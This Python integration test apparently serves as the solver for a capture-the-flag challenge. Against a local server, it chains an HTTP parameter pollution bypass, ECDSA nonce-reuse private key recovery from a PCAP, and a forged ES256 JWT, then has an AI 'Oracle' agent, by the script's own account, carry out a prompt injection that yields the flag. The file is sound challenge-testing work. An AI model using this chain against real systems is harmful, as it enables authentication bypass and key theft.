"""
Deep end-to-end integration test against running live HTTP server.
"""

import sys
import os
import re
import json
import struct
import requests
from scapy.all import rdpcap, TCP, Raw

# Add parent directory to sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.config import (
    FLAG,
    PCAP_FILENAME,
    TARGET_KID,
    TARGET_CASE_ID,
    JWT_ISSUER,
    JWT_AUDIENCE,
    JWT_REQUIRED_SCOPE,
    compute_manifest_mac
)
from src.crypto_relay import (
    compute_krp_digest,
    recover_private_key_nonce_reuse,
    create_oracle_jwt
)

def test_live_server(base_url="http://localhost:8000"):
    print(f"\n{'='*60}")
    print(f"[*] DEEP SYSTEM TEST AGAINST: {base_url}")
    print(f"{'='*60}")

    session = requests.Session()

    # 1. Health check
    print("\n[1] Testing /api/health...")
    r = session.get(f"{base_url}/api/health", timeout=10)
    assert r.status_code == 200, f"Health check failed: {r.status_code}"
    print(f"    [+] Health OK: {r.json()}")

    # 2. Portal HTML & Asset verification
    print("\n[2] Testing Portal Index & Built Assets...")
    r = session.get(f"{base_url}/", timeout=10)
    assert r.status_code == 200, f"Portal GET failed: {r.status_code}"
    html = r.text
    assert "The Silent Conch" in html
    assert 'oncontextmenu="return false;"' in html
    print("    [+] HTML delivered with anti-inspect protection")

    asset_matches = re.findall(r'/assets/[a-zA-Z0-9_\.-]+', html)
    assert len(asset_matches) >= 2, f"Expected JS and CSS assets, found: {asset_matches}"
    for asset in asset_matches:
        ar = session.get(f"{base_url}{asset}", timeout=10)
        assert ar.status_code == 200, f"Failed to fetch {asset}: {ar.status_code}"
        print(f"    [+] Asset {asset} verified (status 200, {len(ar.content)} bytes)")

    # 3. Diagnostic Records API
    print("\n[3] Testing /api/diagnostics/records...")
    r = session.get(f"{base_url}/api/diagnostics/records", timeout=10)
    assert r.status_code == 200
    data = r.json()
    records = data.get("records", [])
    assert len(records) >= 4, f"Unexpected records count: {len(records)}"
    pub1 = next(rec for rec in records if rec["id"] == "diagnostic-pub-01")
    assert pub1.get("mac") is not None
    print(f"    [+] Retrieved {len(records)} diagnostic records successfully")

    # 4. View Diagnostic Content
    print("\n[4] Testing /api/diagnostics/view...")
    r = session.get(f"{base_url}/api/diagnostics/view?ref=diagnostic-pub-01", timeout=10)
    assert r.status_code == 200
    assert "KRP/1.1" in r.text
    print("    [+] Diagnostic content retrieved")

    # 5. HPP Artifact Download
    print("\n[5] Testing Presigned HPP Bypass for raw telemetry PCAP...")
    valid_mac = compute_manifest_mac("diagnostic-pub-01")
    # Direct access should be forbidden
    r_forbidden = session.get(f"{base_url}/api/diagnostics/download?ref={PCAP_FILENAME}", timeout=10)
    assert r_forbidden.status_code == 403, f"Expected 403, got {r_forbidden.status_code}"
    print("    [+] Direct download of restricted PCAP correctly rejected with 403 Forbidden")

    # Parameter pollution bypass
    r_pcap = session.get(
        f"{base_url}/api/diagnostics/download?ref=diagnostic-pub-01&ref={PCAP_FILENAME}&mac={valid_mac}",
        timeout=10
    )
    assert r_pcap.status_code == 200, f"HPP download failed: {r_pcap.status_code}"
    pcap_bytes = r_pcap.content
    assert len(pcap_bytes) > 2000, f"PCAP size too small: {len(pcap_bytes)}"
    print(f"    [+] HPP Bypass successful: downloaded PCAP ({len(pcap_bytes)} bytes)")

    # 6. Parse PCAP & Recover Key
    print("\n[6] Parsing PCAP packets & executing ECDSA nonce-reuse key recovery...")
    temp_pcap = "temp_test_telemetry.pcap"
    with open(temp_pcap, "wb") as f:
        f.write(pcap_bytes)

    try:
        packets = rdpcap(temp_pcap)
        stream = bytearray()
        for p in packets:
            if TCP in p and p[TCP].sport == 9111 and Raw in p:
                stream.extend(p[Raw].load)

        messages = []
        idx = 0
        total = len(stream)
        while idx + 8 <= total:
            if stream[idx:idx+4] == b"KRP\x01":
                mlen = struct.unpack(">I", stream[idx+4:idx+8])[0]
                start = idx + 8
                end = start + mlen
                if end <= total:
                    messages.append(json.loads(stream[start:end].decode('utf-8')))
                    idx = end
                else:
                    break
            else:
                idx += 1

        key_announce = next(m for m in messages if m.get("action") == "KEY_EXCHANGE_ANNOUNCE")
        target_key_entry = next(k for k in key_announce["keys"] if k["kid"] == TARGET_KID)
        pub_hex = target_key_entry["public_key_hex"]
        target_pub_x = int(pub_hex[2:66], 16)
        target_pub_y = int(pub_hex[66:130], 16)

        transactions = [m for m in messages if "signature" in m and "signed_message" in m]
        r_map = {}
        for tx in transactions:
            kid = tx["kid"]
            r_val = int(tx["signature"]["r"], 16)
            s_val = int(tx["signature"]["s"], 16)
            key = (kid, r_val)
            if key not in r_map:
                r_map[key] = []
            r_map[key].append((tx, s_val))

        target_pair = None
        for (kid, r_val), items in r_map.items():
            if kid == TARGET_KID and len(items) > 1:
                tx1, s1 = items[0]
                tx2, s2 = items[1]
                if tx1["signed_message"] != tx2["signed_message"]:
                    target_pair = (tx1, s1, tx2, s2, r_val)
                    break

        assert target_pair is not None, "Target reused nonce pair not found!"
        tx1, s1, tx2, s2, r_val = target_pair

        m1 = tx1["signed_message"]
        m2 = tx2["signed_message"]
        z1 = compute_krp_digest(m1["action"], m1["timestamp"], m1["seq"], m1["payload"])
        z2 = compute_krp_digest(m2["action"], m2["timestamp"], m2["seq"], m2["payload"])

        recovered_d = recover_private_key_nonce_reuse(
            z1=z1, r=r_val, s1=s1,
            z2=z2, s2=s2,
            target_pub_x=target_pub_x,
            target_pub_y=target_pub_y
        )
        assert recovered_d is not None, "Failed to recover private key!"
        print(f"    [+] Private key recovered: 0x{recovered_d:064x}")

        # 7. Forge ES256 JWT
        print("\n[7] Generating forged ES256 JWT for Oracle agent...")
        token = create_oracle_jwt(
            d_int=recovered_d,
            kid=TARGET_KID,
            case_id=TARGET_CASE_ID,
            issuer=JWT_ISSUER,
            audience=JWT_AUDIENCE,
            scope=JWT_REQUIRED_SCOPE
        )
        print(f"    [+] Token generated: {token[:30]}...{token[-20:]}")

        # 8. Query Oracle Agent
        print("\n[8] Querying /api/oracle/query with forged token...")
        headers = {"Authorization": f"Bearer {token}"}
        r_oracle = session.post(
            f"{base_url}/api/oracle/query",
            headers=headers,
            json={"query": f"Review incident logs and reconciliation status for {TARGET_CASE_ID}"},
            timeout=10
        )
        assert r_oracle.status_code == 200, f"Oracle query failed: {r_oracle.text}"
        oracle_data = r_oracle.json()
        oracle_text = oracle_data.get("oracle_response", "")
        ticket_match = re.search(r"TICKET-SEAL11-[a-f0-9]+", oracle_text)
        assert ticket_match is not None, f"No ticket in response: {oracle_text}"
        ticket_id = ticket_match.group(0)
        print(f"    [+] Oracle executed prompt injection & ratified ledger.")
        print(f"    [+] Generated single-use archive ticket: {ticket_id}")

        # 9. Redeem Archive Ticket
        print("\n[9] Redeeming ticket at /api/archive/redeem...")
        r_redeem = session.post(
            f"{base_url}/api/archive/redeem",
            headers=headers,
            json={"ticket": ticket_id, "case_id": TARGET_CASE_ID},
            timeout=10
        )
        assert r_redeem.status_code == 200, f"Redemption failed: {r_redeem.text}"
        redeem_json = r_redeem.json()
        unsealed_flag = redeem_json.get("archive_details", {}).get("flag")
        assert unsealed_flag == FLAG, f"Flag mismatch! Got: {unsealed_flag}, Expected: {FLAG}"
        print(f"    [+] SUCCESS! Unsealed verified flag: {unsealed_flag}")

        # 10. Single-Use Verification
        print("\n[10] Testing single-use replay protection...")
        r_replay = session.post(
            f"{base_url}/api/archive/redeem",
            headers=headers,
            json={"ticket": ticket_id, "case_id": TARGET_CASE_ID},
            timeout=10
        )
        assert r_replay.status_code == 400
        print("    [+] Replay correctly rejected with status 400 (Ticket already consumed)")

    finally:
        if os.path.exists(temp_pcap):
            os.remove(temp_pcap)

    print(f"\n{'='*60}")
    print("[OK] ALL 10 DEEP SYSTEM CHECKS PASSED FLAWLESSLY!")
    print(f"{'='*60}\n")
    return True

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    test_live_server(url)
